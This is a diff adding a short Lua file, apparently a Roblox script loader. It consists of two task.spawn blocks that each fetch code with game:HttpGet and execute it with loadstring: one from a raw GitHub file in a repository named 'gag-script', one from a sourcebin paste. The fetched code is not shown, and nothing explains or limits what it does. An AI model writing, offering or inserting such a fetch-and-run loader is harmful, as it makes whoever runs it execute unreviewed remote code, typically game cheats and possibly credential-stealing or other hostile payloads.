@@ -1,0 +1,7 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ranchudaz/gag-script/refs/heads/main/message.txt", true))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/FpnlHNbQXd/0", true))()
+end)
